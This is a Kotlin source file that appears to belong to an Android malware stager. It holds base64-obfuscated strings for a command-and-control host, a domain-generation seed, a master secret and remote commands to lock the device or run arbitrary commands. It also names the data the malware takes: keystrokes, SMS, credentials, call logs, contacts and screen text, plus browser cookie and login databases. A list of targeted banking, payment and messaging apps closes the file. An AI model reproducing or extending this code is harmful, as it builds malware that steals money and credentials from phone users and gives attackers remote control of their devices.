package com.chameleon.stager.utils

object ObfuscatedStrings {
    private fun o(s: String): String = CryptoUtils.deobfuscateString(s)

    val c2Host: String get() = o("IiIiezg8JzQ8Mjk6NzQ5eyY8ITA=")
    val wsPath: String get() = o("eiIm")
    val payloadPath: String get() = o("ejQlPHolNCw5OjQx")
    val masterSecret: String get() = o("MRk0HhInECAUNjYHNxI3ZmZiI20mZzAiLxYFIjwMD2MhJhkcPQwMGB8QEGg=")

    val notifChannelId: String get() = o("Nj00ODA5MDo7CiYsOzY=")
    val notifTitle: String get() = o("BiwmITA4dQYsOzY=")
    val notifText: String get() = o("Biw7Njw7MnUxMCM8NjB1JjAhITw7MiY=")

    val dgaSeed: String get() = o("Nj00ODA5MDo7eDZneCYwMDF4Z2VnYw==")
    val dgaTemplate: String get() = o("Nj00Jzh4cCZ4cCZ7Njo4")

    val cmdStartSweep: String get() = o("JiE0JyEKJiIwMCU=")
    val cmdStopSweep: String get() = o("JiE6JQomIjAwJQ==")
    val cmdLockDevice: String get() = o("OTo2PgoxMCM8NjA=")
    val cmdReleaseDevice: String get() = o("JzA5MDQmMAoxMCM8NjA=")
    val cmdExecCommand: String get() = o("MC0wNgo2Ojg4NDsx")
    val cmdUpdateConfig: String get() = o("ICUxNCEwCjY6OzM8Mg==")

    val msgRegister: String get() = o("JzAyPCYhMCc=")
    val msgHeartbeat: String get() = o("PTA0JyE3MDQh")
    val msgData: String get() = o("MTQhNA==")
    val msgCommand: String get() = o("Njo4ODQ7MQ==")
    val msgCommandAck: String get() = o("Njo4ODQ7MQo0Nj4=")

    val dataKeylog: String get() = o("PjAsOToy")
    val dataSms: String get() = o("Jjgm")
    val dataSession: String get() = o("JjAmJjw6Ow==")
    val dataFile: String get() = o("Mzw5MA==")
    val dataNotification: String get() = o("OzohPDM8NjQhPDo7")
    val dataCredential: String get() = o("NicwMTA7ITw0OQ==")
    val dataCallLog: String get() = o("NjQ5OQo5OjI=")
    val dataContact: String get() = o("Njo7ITQ2IQ==")
    val dataAppChange: String get() = o("NCUlCjY9NDsyMA==")
    val dataScreenText: String get() = o("JjYnMDA7ITAtIQ==")
    val dataTargetApp: String get() = o("ITQnMjAhCjQlJQ==")

    val browserChrome: String get() = o("Njo4ezQ7MSc6PDF7Nj0nOjgw")
    val browserFirefox: String get() = o("Oicyezg6Lzw5OTR7MzwnMDM6LQ==")
    val browserBrave: String get() = o("Njo4ezcnNCMwezcnOiImMCc=")
    val browserOpera: String get() = o("Njo4ezolMCc0ezcnOiImMCc=")
    val browserEdge: String get() = o("Njo4ezg8Nic6JjozIXswODgt")
    val browserSamsung: String get() = o("Njo4eyYwNns0OzEnOjwxezQlJXsmNyc6IiYwJw==")
    val browserStock: String get() = o("Njo4ezQ7MSc6PDF7Nyc6IiYwJw==")

    val cookiesDb: String get() = o("Fjo6PjwwJg==")
    val loginDataDb: String get() = o("GToyPDt1ETQhNA==")
    val webDataDb: String get() = o("AjA3dRE0ITQ=")

    val targetBKash: String get() = o("Nz40Jj0=")
    val targetNagad: String get() = o("OzQyNDE=")
    val targetPaytm: String get() = o("JTQsITg=")
    val targetPaypal: String get() = o("JTQsJTQ5")
    val targetStripe: String get() = o("JiEnPCUw")
    val targetVenmo: String get() = o("IzA7ODo=")
    val targetWhatsApp: String get() = o("Ij00ISY0JSU=")
    val targetTelegram: String get() = o("ITA5MDInNDg=")
    val targetFacebook: String get() = o("MzQ2MDc6Oj4=")
    val targetInstagram: String get() = o("PDsmITQyJzQ4")
    val targetLinkedIn: String get() = o("OTw7PjAxPDs=")
    val targetGmail: String get() = o("Mjg0PDk=")
    val targetOutlook: String get() = o("OiAhOTo6Pg==")
}
